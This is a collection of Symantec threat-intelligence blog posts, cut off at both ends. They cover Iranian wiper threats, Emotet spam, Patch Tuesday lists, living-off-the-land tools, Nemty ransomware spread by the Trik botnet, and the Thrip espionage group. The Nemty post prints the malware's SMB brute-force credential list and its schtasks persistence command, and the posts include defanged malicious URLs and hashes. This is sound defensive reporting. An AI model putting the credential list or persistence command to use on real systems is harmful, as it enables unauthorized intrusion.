the group shortly before Shamoon struck. With this in mind, any organization that finds indicators of compromise (IOCs) related to any Iran-linked espionage group on their network should exercise extreme vigilance. While destructive attacks remain a relative rarity, a prior intrusion does appear to be a necessary precursor. Aside from the aforementioned groups, other Iran-linked groups that are highly active at present includeChafer, Crambus (aka OilRig), andSeedworm. Given the recent history of attacks, it is evident that Iranian-sponsored groups consider destruction of equipment as an acceptable form of damage to targets. However, to date these incidents have only targeted Middle Eastern entities. Iranian actors have not yet shown an appetite for conducting similar attacks against organizations further afield. Considering the tense geopolitical climate in 2020 and based on previous Iranian activity, we believe cyber attacks originating from Iran or Iranian proxies would be (in order of descending probability): While Symantec has yet to see any evidence of a notable uptick in activity, this should not be misinterpreted, since planned operations could take some time to prepare and execute. Organizations associated with the U.S. and its allies are an obvious target. While Iranian actors have, to date, heavily focused on organizations in the Middle East, attacks against the U.S. should not be ruled out, particularly considering the heightened state of tensions at present. However, organizations based in the Middle East likely remain most at risk, given that Iranian groups know this region best and may already have ongoing compromises. Destructive attacks, such as those involving disk wipers, usually require some prior compromise of the organization’s network. This may mean that any potential destructive attacks could be focused on the Middle East, particularly if the attackers are under time pressure to retaliate. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/tensions-iran-destructive-attacks"
  },
  {
    "title": "increase emotet spam observed blocked symantec",
    "content": "At the end of 2018, it appeared that the Emotet group had gone dark when its malware campaigns greatly reduced in size. There was another major decline in the summer months of 2019; however, in September 2019, there was an increase in activity (over 100 percent) with Emotet’s (Trojan.Emotet) command and control (C&C) servers delivering a new wave of malicious binaries. As the months went on, we noticed that the volume of malware sent from the C&C servers was increasing. At times, over 1 million hits per day were being blocked by Symantec’s various protection services. Customers using Symantec Messaging Gateway (SMG) or the Email Security.cloud service have even greater protection as these malicious emails are blocked before reaching the end user. Our telemetry showed a blocking volume increase with these technologies. However, because these technologies were able to stop the attacks successfully at an earlier stage in the attack chain, it caused a reduction in the need to use endpoint protection for blocking. Products like Symantec SMG and Email Security.cloud provide a way to block malware at the cloud level before it reaches your network. Emotetstarted out as a banking Trojanfocused on stealing user information by sniffing networks. Over the years, Emotet has evolved by constantly updating its codebase and sophisticated evasion techniques. The Emotet criminals are known to run their botnet as a Malware-as-a-Service (MaaS), enabling other threat actors to easily distribute various malicious payloads such as AZORult (Infostealer.Rultazo), IcedID (Trojan.IcedID), TrickBot (Trojan.Trickybot) etc. The types of emails being used in these attacks come in various forms. The first is an email with a link to an Office document file that contains a malicious macro, which then downloads the malicious executable payload (Figure 2). The Email .Cloud product contains the Link Following service that follows any links it finds in emails to determine if they are spam or malware, which is just one of the benefits of using Email Security.cloud. The second type of email we observed is one with the Office document attached to the email (Figure 3). Document SHA256: 4e35e66d898a56184f42674c5bc41d4abe219beabeafb4cbdddf8ae974326839 Emotet uses social engineering techniques in its spam campaigns, tricking users into opening the file and running the macro to infect victims’ computers. As seen in Figure 4, the document uses a fake warning message asking users to “Enable Editing” in an attempt to trick the user into executing the malicious macro script. The document summary information shows the document was created just a few hours prior to the attack. When the document is opened a malicious macro downloads Emotet’s main module. The macro, which is highly obfuscated in an attempt to bypass traditional antivirus signatures, uses Windows Management Instrumentation (WMI ) classes, such as winmgmts:Win32_Process, to call powershell.exe. Emotet is known to hide its payloads in a document’s objects and streams and this variant is no different. Figure 7 shows a Base64-encoded malicious payload hidden in document streams. The macro uses an obfuscated PowerShell command to download the Emotet binaries. By using legitimateliving-off-the-landbinaries (LoLBins), such as windows PowerShell and WMI, the macro can evade detection by security software. The Emotet module downloads additional payloads to the user’s computer. In Figure 11, we can see that the Emotet module has downloaded the file scanscan.exe to the %AppData% folder. This is the final TrickBot payload, which will conduct further destructive activities. Emotet will create a persistent entry in the registry to make sure that TrickBot runs every time the user logs on. SHA256-4e35e66d898a56184f42674c5bc41d4abe219beabeafb4cbdddf8ae974326839 url: [hxxp]: [//]www.4celia.com/wp-admin/2z8/ url: [hxxp]: [//]capsaciphone.com/wp-admin/q07360/ url: [hxxp]: [//]travalogo.com/pseovck27kr/est21175/ url: [hxxp]: [//] miracles-of-quran.com/css/ny77597/ url: [hxxp]: [//]essay.essaytutors.net/cgi-bin/mqdm65698/ HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\scanscan scanscan.exe - %APPDATA%\\Local\\scanscan\\scanscan.exe These IoCs are for just one of the variants of Emotet we blocked on December 12, 2019. We have seen multiple similar variants successfully blocked by our heuristics engine scanner over the past few months. We have blocked a high volume of malicious emails with various social engineering subject lines targeting various financial institutions. Some of the subject lines contained the following keywords: These runs were successfully blocked with heuristics that were created as far back as 2016 for our Email Security.cloud security scanner. The advanced scanner is methodical in detecting obfuscation techniques used to hide malicious payloads. Email Security.cloud customers are protected from malware campaigns such as the one discussed in this blog. Symantec proactively protects against Emotet spam with its email security suite of products: File-based protection: Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/increase-emotet-spam-observed-blocked-symantec"
  },
  {
    "title": "microsoft patch tuesday january 2020",
    "content": "This month the vendor has patched 49 vulnerabilities, 8 of which are rated Critical. As always, customers are advised to follow these security best practices: Microsoft's summary of the January 2020 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Security Update for Internet Explorer Internet Explorer Memory Corruption Vulnerability(CVE-2020-0640)MS Rating: Critical Cumulative Security Updates for Microsoft Office Microsoft Office Online Spoofing Vulnerability(CVE-2020-0647)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2020-0650)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2020-0651)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2020-0652)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2020-0653)MS Rating: Important Cumulative Security Updates for Microsoft Windows Windows RDP Gateway Server Remote Code Execution Vulnerability(CVE-2020-0610)MS Rating: Critical Remote Desktop Client Remote Code Execution Vulnerability(CVE-2020-0611)MS Rating: Critical Windows RDP Gateway Server Remote Code Execution Vulnerability(CVE-2020-0609)MS Rating: Critical Windows CryptoAPI Spoofing Vulnerability(CVE-2020-0601)MS Rating: Important Windows Remote Desktop Protocol (RDP) Gateway Server Denial of Service Vulnerability(CVE-2020-0612)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0613)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0614)MS Rating: Important Windows Common Log File System Driver Information Disclosure Vulnerability(CVE-2020-0615)MS Rating: Important Microsoft Windows Denial of Service Vulnerability(CVE-2020-0616)MS Rating: Important Microsoft Cryptographic Services Privilege Escalation Vulnerability(CVE-2020-0620)MS Rating: Important Windows Security Bypass Vulnerability(CVE-2020-0621)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0623)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0625)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0626)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0627)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0628)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0629)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0630)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0631)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0632)MS Rating: Important Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0633)MS Rating: Important Windows Common Log File System Driver Privilege Escalation Vulnerability(CVE-2020-0634)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2020-0635)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2020-0636)MS Rating: Important Remote Desktop Web Access Information Disclosure Vulnerability(CVE-2020-0637)MS Rating: Important Update Notification Manager Privilege Escalation Vulnerability(CVE-2020-0638)MS Rating: Important Windows Common Log File System Driver Information Disclosure Vulnerability(CVE-2020-0639)MS Rating: Important Microsoft Windows Privilege Escalation Vulnerability(CVE-2020-0641)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2020-0644)MS Rating: Important Cumulative Security Updates for Microsoft Windows Kernel Win32k Information Disclosure Vulnerability(CVE-2020-0608)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2020-0642)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2020-0624)MS Rating: Important Security Update for Windows Hyper-V Hyper-V Denial of Service Vulnerability(CVE-2020-0617)MS Rating: Important Cumulative Security Updates for Microsoft Graphics Component Microsoft Graphics Components Information Disclosure Vulnerability( CVE-2020-0607 )MS Rating: Important Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2020-0622)MS Rating: Important Windows GDI+ Information Disclosure Vulnerability(CVE-2020-0643)MS Rating: Important Cumulative Security Updates for ASP .NET ASP.NET Core Remote Code Execution Vulnerability(CVE-2020-0603)MS Rating: Critical ASP.NET Core Denial of Service Vulnerability(CVE-2020-0602)MS Rating: Important Cumulative Security Updates for .NET Framework .NET Core Remote Code Execution Vulnerability(CVE-2020-0605)MS Rating: Critical .NET Framework Remote Code Execution Injection Vulnerability(CVE-2020-0606)MS Rating: Critical .NET Framework Remote Code Execution Injection Vulnerability(CVE-2020-0646)MS Rating: Critical Security Update for Microsoft Dynamics Microsoft Dynamics 365 (On-Premise) Cross Site Scripting Vulnerability(CVE-2020-0656)MS Rating: Important Security Update for Microsoft OneDrive for Android Microsoft OneDrive for Android Security Bypass Vulnerability(CVE-2020-0654)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Preethi Koroth is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-january-2020"
  },
  {
    "title": "living land legitimate tools malicious",
    "content": "“Living-off-the-land” tactics—where attackers take advantage of native tools and services already present on targeted systems—have been used by both targeted attack groups and common cyber criminal gangs for some time now. Symantec has previously published research that gives a general overview ofliving-off-the-land tactics and fileless attack techniques; however, ournew researchprovides updated statistics on the dual-use tools utilized in these attacks—with a focus on PowerShell and Windows Management Instrumentation (WMI)—and how they are currently being used by different attack groups. The most frequently executed tools observed by Symantec in Q1 2019 were net.exe, PowerShell, the certification utility, the task scheduler, and the WMI command line (WMIC). However, only a fraction of the overall usage of these tools was malicious. The context and execution sequence must be considered when determining if usage is malicious or benign. To do this, we extract execution patterns from our data with the help of advanced machine learning, and the data is then analyzed by our AI-based Targeted Attack Analytics (TAA) component. We also looked at more than 500,000 dual-use tool detections from the beginning of September 2019, which were either used to download or copy payloads to target computers. This revealed that WMI, the command line tool, and PowerShell were most frequently used for malicious purposes, accounting for 89 percent of all dual-use tools used as downloaders. In September 2019 alone, Symantec blocked more than 480,000 malicious PowerShell scripts on endpoints. This number, while significant and steadily increasing, still only represents 0.8 percent of all observed PowerShell usage. Symantec data from between September 2018 and September 2019 shows a 406 percent increase in the number of blocked PowerShell scripts, and this number is likely to increase even further. We also analyzed 100,000 PowerShell command line arguments, keywords used, and frequency of occurrence of parent processes, to discover which were the most frequently used during attacks. Full details of this can be seen inthe white paper. Interestingly, 48 percent of all malicious PowerShell commands were started through WMI. The tool is commonly used to spread PowerShell scripts laterally in internal networks. A typical process for executing a command on a remote system using WMI involves the remote system spawning an instance of wmiprvse.exe and then running the command which, as mentioned, is often a PowerShell command. This means that wmiprvse.exe is present in most process parent chains for malicious PowerShell scripts. Targeted attack groups have been using living-off-the-land tactics for a long time, with almost all active groups having been spotted using dual-use tools at some point. Using these methods allows the attackers to hide their activity among legitimate administration work, and makes attribution difficult as there are no binaries to be analyzed and fewer indicators of compromise (IoC). Looking at six active targeted attack groups and the living-off-the-land tools they use reveals that PowerShell is by far the most popular, with all six utilizing it in their attacks. In all, around 77 percent of targeted attack incidents made use of PowerShell. The credential-dumping tool Mimikatz, used by four of the groups, is the second most popular tool. To learn more about the latest living-off-the-land tactics and techniques, download our white paper:Living off the Land – Turning Your Infrastructure Against You Symantec solutions use multiple security technologies to defend against living-off-the-land and fileless attacks, including endpoint security, endpoint detection and response, email security, and network security. Symantec Endpoint Protection solutionincludes various dedicated features that specifically tackle the living-off-the-land challenge. In addition toSymantec Endpoint Detection and Response(SEDR),Symantec’s Managed Endpoint Detection and Response Service (MEDR)leverages automated attack hunting provided by analytics as well as Symantec analyst security expertise to remotely investigate and contain incursions by adversaries in customer networks. Symantec recommends users observe the following best practices to protect against targeted attacks: Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/living-land-legitimate-tools-malicious"
  },
  {
    "title": "microsoft patch tuesday december 2019",
    "content": "This month the vendor has patched 36 vulnerabilities, 7 of which are rated Critical. As always, customers are advised to follow these security best practices: Microsoft's summary of the December 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Internet Explorer VBScript Remote Code Execution Vulnerability(CVE-2019-1485)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Word Denial of Service Vulnerability(CVE-2019-1461)MS Rating: Important Microsoft PowerPoint Remote Code Execution Vulnerability(CVE-2019-1462)MS Rating: Important Microsoft Access Information Disclosure Vulnerability(CVE-2019-1463)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2019-1464)MS Rating: Important Microsoft Access Information Disclosure Vulnerability(CVE-2019-1400)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Win32k Privilege Escalation Vulnerability(CVE-2019-1458)MS Rating: Important Win32k Information Disclosure Vulnerability(CVE-2019-1469)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-1472)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-1474)MS Rating: Important Cumulative Security Update for Microsoft Hyper-V Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-1471)MS Rating: Critical Windows Hyper-V Information Disclosure Vulnerability(CVE-2019-1470)MS Rating: Important Security Update for Microsoft Graphics Win32k Graphics Remote Code Execution Vulnerability(CVE-2019-1468)MS Rating: Critical Windows GDI Information Disclosure Vulnerability(CVE-2019-1465)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1466)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1467)MS Rating: Important Security Update for Microsoft Windows Windows Privilege Escalation Vulnerability(CVE-2019-1476)MS Rating: Important Windows Printer Service Privilege Escalation Vulnerability(CVE-2019-1477)MS Rating: Important Windows COM Server Privilege Escalation Vulnerability(CVE-2019-1478)MS Rating: Important Windows Media Player Information Disclosure Vulnerability(CVE-2019-1480)MS Rating: Important Windows Media Player Information Disclosure Vulnerability(CVE-2019-1481)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1483)MS Rating: Important Windows OLE Remote Code Execution Vulnerability(CVE-2019-1484)MS Rating: Important Windows Remote Desktop Protocol (RDP) Denial of Service Vulnerability(CVE-2019-1453)MS Rating: Important Remote Desktop Protocol Information Disclosure Vulnerability(CVE-2019-1489)MS Rating: Important Security Update for Microsoft SQL Server Microsoft SQL Server Reporting Services XSS Vulnerability(CVE-2019-1332)MS Rating: Important Security Update for Microsoft Visual Studio Git for Visual Studio Remote Code Execution Vulnerability(CVE-2019-1349)MS Rating: Critical Git for Visual Studio Remote Code Execution Vulnerability(CVE-2019-1350)MS Rating: Critical Git for Visual Studio Remote Code Execution Vulnerability(CVE-2019-1352)MS Rating: Critical Git for Visual Studio Remote Code Execution Vulnerability(CVE-2019-1354)MS Rating: Critical Git for Visual Studio Remote Code Execution Vulnerability(CVE-2019-1387)MS Rating: Critical Visual Studio Live Share Spoofing Vulnerability(CVE-2019-1486)MS Rating: Important Git for Visual Studio Tampering Vulnerability(CVE-2019-1351)MS Rating: Moderate Security Update for Microsoft Authentication Library for Android Microsoft Authentication Library for Android Information Disclosure Vulnerability(CVE-2019-1487)MS Rating: Important Security Update for Microsoft Defender Microsoft Defender Security Bypass Vulnerability(CVE-2019-1488)MS Rating: Important Security Update for Skype for Business Server Skype for Business and Lync Spoofing Vulnerability(CVE-2019-1490)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Preethi Koroth is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-december-2019"
  },
  {
    "title": "microsoft patch tuesday november 2019",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the November 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Scripting Engine Memory Corruption Vulnerability(CVE-2019-1426)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-1427)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-1428)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-1429)MS Rating: Critical VBScript Remote Code Execution Vulnerability(CVE-2019-1390)MS Rating: Critical Microsoft Edge Security Bypass Vulnerability(CVE-2019-1413)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Office Security Bypass Vulnerability(CVE-2019-1442)MS Rating: Important Microsoft SharePoint Information Disclosure Vulnerability(CVE-2019-1443)MS Rating: Important Microsoft Office Online Spoofing Vulnerability(CVE-2019-1445)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2019-1446)MS Rating: Important Microsoft Office Online Spoofing Vulnerability(CVE-2019-1447)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2019-1448)MS Rating: Important Microsoft Office ClickToRun Security Bypass Vulnerability(CVE-2019-1449)MS Rating: Important Microsoft Access Information Disclosure Vulnerability(CVE-2019-1402)MS Rating: Important Microsoft Office Excel Security Bypass Vulnerability(CVE-2019-1457)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Win32k Graphics Remote Code Execution Vulnerability(CVE-2019-1441)MS Rating: Critical Win32k Privilege Escalation Vulnerability(CVE-2019-1393)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-1394)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-1395)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-1396)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-1408)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-1434)MS Rating: Important Win32k Information Disclosure Vulnerability(CVE-2019-1436)MS Rating: Important Win32k Information Disclosure Vulnerability(CVE-2019-1440)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-11135)MS Rating: Important Windows Kernel Privilege Escalation Vulnerability(CVE-2019-1392)MS Rating: Important Cumulative Security Update for Microsoft Hyper-V Hyper-V Remote Code Execution Vulnerability(CVE-2019-0719)MS Rating: Critical Hyper-V Remote Code Execution Vulnerability(CVE-2019-0721)MS Rating: Critical Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-1389)MS Rating: Critical Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-1397)MS Rating: Critical Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-1398)MS Rating: Critical Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0712)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2019-1309)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2019-1310)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2019-1399)MS Rating: Important Security Update for Microsoft Graphics Windows Graphics Component Privilege Escalation Vulnerability(CVE-2019-1407)MS Rating: Important Windows Graphics Component Privilege Escalation Vulnerability(CVE-2019-1433)MS Rating: Important Windows Graphics Component Privilege Escalation Vulnerability(CVE-2019-1435)MS Rating: Important Windows Graphics Component Privilege Escalation Vulnerability(CVE-2019-1437)MS Rating: Important Windows Graphics Component Privilege Escalation Vulnerability(CVE-2019-1438)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1439)MS Rating: Important Security Update for Microsoft Windows Microsoft Windows Media Foundation Remote Code Execution Vulnerability(CVE-2019-1430)MS Rating: Critical Windows TCP/IP Information Disclosure Vulnerability(CVE-2019-1324)MS Rating: Important Windows Error Reporting Information Disclosure Vulnerability(CVE-2019-1374)MS Rating: Important Windows Data Sharing Service Privilege Escalation Vulnerability(CVE-2019-1379)MS Rating: Important Microsoft splwow64 Privilege Escalation Vulnerability(CVE-2019-1380)MS Rating: Important Microsoft Windows Information Disclosure Vulnerability(CVE-2019-1381)MS Rating: Important Microsoft ActiveX Installer Service Privilege Escalation Vulnerability(CVE-2019-1382)MS Rating: Important Windows Data Sharing Service Privilege Escalation Vulnerability(CVE-2019-1383)MS Rating: Important Microsoft Windows Security Bypass Vulnerability(CVE-2019-1384)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1385)MS Rating: Important Windows Certificate Dialog Privilege Escalation Vulnerability(CVE-2019-1388)MS Rating: Important Windows Denial of Service Vulnerability(CVE-2019-1391)MS Rating: Important Windows UPnP Service Privilege Escalation Vulnerability(CVE-2019-1405)MS Rating: Important Windows Remote Procedure Call Information Disclosure Vulnerability(CVE-2019-1409)MS Rating: Important DirectWrite Information Disclosure Vulnerability(CVE-2019-1411)MS Rating: Important Windows Installer Privilege Escalation Vulnerability(CVE-2019-1415)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2019-1416)MS Rating: Important Windows Data Sharing Service Privilege Escalation Vulnerability(CVE-2019-1417)MS Rating: Important Windows Modules Installer Service Information Disclosure Vulnerability(CVE-2019-1418)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1420)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1422)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1423)MS Rating: Important NetLogon Security Bypass Vulnerability(CVE-2019-1424)MS Rating: Important DirectWrite Information Disclosure Vulnerability(CVE-2019-1432)MS Rating: Important Windows User Profile Service Privilege Escalation Vulnerability(CVE-2019-1454)MS Rating: Important Windows Denial of Service Vulnerability(CVE-2018-12207)MS Rating: Important Security Update for Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-1406)MS Rating: Important Security Update for Microsoft Exchange Microsoft Exchange Remote Code Execution Vulnerability(CVE-2019-1373)MS Rating: Critical Security Update for Azure Azure Stack Spoofing Vulnerability(CVE-2019-1234)MS Rating: Important Security Update for Open Enclave SDK Open Enclave SDK Information Disclosure Vulnerability(CVE-2019-1370)MS Rating: Important Security Update for Visual Studio Visual Studio Privilege Escalation Vulnerability(CVE-2019-1425)MS Rating: Important Security Update for OpenType Font Driver OpenType Font Parsing Remote Code Execution Vulnerability(CVE-2019-1419)MS Rating: Critical OpenType Font Driver Information Disclosure Vulnerability(CVE-2019-1412)MS Rating: Important OpenType Font Parsing Remote Code Execution Vulnerability(CVE-2019-1456)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-november-2019"
  },
  {
    "title": "nemty ransomware trik botnet",
    "content": "The Nemty ransomware (Ransom.Nemty), initially detected in August 2019, has increased its reach by partnering up with the Trik botnet (Trojan.Wortrik), which now delivers Nemty to compromised computers. Trik, also known as Phorpiex, has been around for approximately 10 years. In its early days, the malware self-propagated via removable USB drives, Windows Live Messenger, or Skype private messages. The criminals behind the botnet use the infected computers to send email spam and have been observed pushing out a wide range of malware families, with Nemty being the latest to join the list. Nemty, meanwhile, first appeared on the scene in mid-August 2019. While the malware first appeared to be a run-of-the-mill ransomware, a constant series of changes to the threat made it apparent that it was very mucha work in progressand something to be taken seriously. In the past, Nemty has been observed being spread via the RIG exploit kit, as well as via malicious spam campaigns targeting users in Korea and China, where the malware is attached inside an archive. Our data shows that most Nemty infections are found in Korea and China. In early October, we noticed that Trik had begun distributing Nemty as a payload, adding another channel for the ransomware’s delivery. We observed a recent version of Trik delivering a tiny component that uses the Server Message Block (SMB) protocol and a list of hardcoded credentials to try to connect to remote computers with port 139 open. First, the SMB component creates the following registry entry: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\\"[PATH OF THE ORIGINAL FILE]\" = \"[PATH OF THE ORIGINAL FILE]:*:Enabled: Windows NetBIOS Driver\" Trik then checks if the filewinsvcs.txtis present or not in the%AppData%directory on the compromised computer. This file is present if the computer has previously been infected with Trik. To find targets, the SMB componentgenerates random IP addresses then tries to connect to them on port 139. From analysing the malware’s code, we can see that it skips the routine if the created IP address is a local one (Figure 4). The malware can infect public IP addresses with port 139 open that are using any of the common administrator usernames and passwords on its list. Usernames:Administrator, administrator, Admin, admin Passwords:123, 1234, 12345, 123456, 1234567, 12345678, 123456789, 1234567890, 123123, 12321, 123321, 123abc, 123qwe, 123asd, 1234abcd, 1234qwer, 1q2w3e, a1b2c3, administrator, Administrator, admin, Admin, admin123, Admin123, admin12345, Admin12345, administrator123, Ad ministrator123, nimda, qwewq, qweewq, qwerty, qweasd, asdsa, asddsa, asdzxc, asdfgh, qweasdzxc, q1w2e3, qazwsx, qazwsxedc, zxcxz, zxccxz, zxcvb, zxcvbn, passwd, password, Password, login, Login, pass, mypass, mypassword, adminadmin, root, rootroot, test, testtest, temp, temptemp, foofoo, foobar, default, password1, password12, password123, admin1, admin12, admin123, pass1, pass12, pass123, root123, abc123, abcde, abcabc, qwe123, test123, temp123, sample, example, internet, Internet If access is granted, the malware uses the SMB protocol to copy itself to the remote machine. It then uses the Windows Service Control Manager to start the SMB component’s process on the remote machine. The sample running on the remote machine also checks for the presence of winsvcs.txt, which again determines whether or not Nemty is downloaded and executed. Other researchers have provided a detailed analysis of Nemty 1.0. However, during our analysis of Nemty 1.6, we noted some key updates compared to 1.0, which are listed here: cmd.exe /c schtasks.exe /create /sc onstart /tn “NEMTY_<FILEID>_” /tr “C:\\Users\\user\\AdobeUpdate.exe” The developers behind the Nemty ransomware are constantly updating and improving its code, as well as its delivery methods, in an attempt to reach more victims. The Trik botnet, itself known foradapting to the latest trendsin order to stay relevant, makes a perfect partner in crime for Nemty. Symantec has the following protection in place to protect customers against these attacks: File-based protection Network-based protection (Intrusion Prevention System) SymantecEmail Security.cloudtechnology blocks email spreading this threat using advanced heuristics. Hoang Giang is a member of the Threat Engineering team in Symantec’s Security Technology and Response (STAR) division. He analyzes and creates protection for various threats and monitors for botnets and APT attacks. Eduardo is a member of Symantec’s Security Technology and Response (STAR) team who are focused on providing round-the-clock protection against current and future cyber threats. Hasib is a member of Symantec’s Security Technology and Response (STAR) team who are focused on providing round-the-clock protection against current and future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/nemty-ransomware-trik-botnet"
  },
  {
    "title": "thrip apt south east asia",
    "content": "Since Symantecfirst exposed the Thrip group in 2018, the stealthy China-based espionage group has continued to mount attacks in South East Asia, hitting military organizations, satellite communications operators, and a diverse range of other targets in the region. Many of its recent attacks have involved a previously unseen backdoor known as Hannotog (Backdoor.Hannotog) and another backdoor known as Sagerunex (Backdoor.Sagerunex). Analysis of the latter has revealed close links to another long-established espionage group called Billbug (aka Lotus Blossom). In all likelihood, Thrip and Billbug now appear to be one and the same. Since we last published on Thrip in June 2018, the group has attacked at least 12 organizations, all located within South East Asia. Its targets have been located in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. The group has attacked a diverse range of targets over the past year, most notably military targets in two different countries. It has also attacked organizations in the maritime communications, media, and education sectors. Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019. One of the most alarming discoveries we made in our original Thrip research was that the group had targeted a satellite communications operator and seemed to be interested in the operational side of the company, looking for and infecting computers running software that monitored and controlled satellites. Significantly, Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019. Much of this recent activity was uncovered by Symantec following the discovery of a Thrip tool, a backdoor called Hannotog which appears to have been used since at least January 2017. It was first detected in an organization in Malaysia, where it triggered an alert for suspicious WMI activity with ourTargeted Attack Analytics (TAA)technology, available in Symantec Endpoint Detection and Response (EDR). TAA leverages artificial intelligence in order to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. TAA allowed us to uncover Hannotog and from there, our expert threat hunting team built out a profile of the adversary’s tools, tactics, and procedures. This allowed us to identify other organizations that have been compromised by Thrip, allowing us to build up a complete picture of the group’s most recent activities. Hannotog is a custom backdoor which provides the attackers with a persistent presence on the victim’s network. It has been used in conjunction with several other Thrip tools, including Sagerunex, another custom backdoor providing remote access to the attackers, and Catchamas 